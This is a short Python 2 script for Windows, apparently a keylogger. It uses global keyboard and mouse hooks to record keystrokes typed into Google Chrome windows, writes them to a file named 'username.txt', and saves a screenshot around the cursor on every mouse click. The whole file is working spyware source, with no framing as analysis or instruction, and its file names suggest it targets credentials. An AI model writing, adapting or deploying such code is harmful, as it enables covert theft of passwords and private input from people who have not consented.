# -*- coding: cp950 -*-
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import time
from PIL import ImageGrab

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None
thepid = None
process_id = None
output = ''

def get_current_process():
    global thepid
    global process_id

    hwnd = user32.GetForegroundWindow()

    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    process_id = "%d" % pid.value

    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    if window_title.value.find('Google Chrome') != -1:
        thepid = process_id

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def OnMouseEvent(event):
    get_current_process()
    global thepid
    global process_id
    if process_id == thepid:
        s = time.strftime("%Y%m%d_%H-%M-%S", time.localtime()) + '.jpg'
        print s
        x,y = event.Position
        screenshot(x,y,s)
    return True

def screenshot(x,y,s):
    global output
    f = open('username.txt','a')
    f.write(output+'\n')
    im = ImageGrab.grab((x-200,y-100,x+200,y+50))
    im.save(s,'jpeg') 

def KeyStroke(event):
    global output
    global current_window
    global thepid
    global process_id
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()
        print current_window

    if process_id == thepid:
        if event.Ascii > 32 and event.Ascii < 127:
            output += chr(event.Ascii)

    return True


kl         = pyHook.HookManager()
kl.SubscribeMouseAllButtonsDown(OnMouseEvent)
kl.KeyDown = KeyStroke
kl.HookKeyboard()
kl.HookMouse()
pythoncom.PumpMessages()

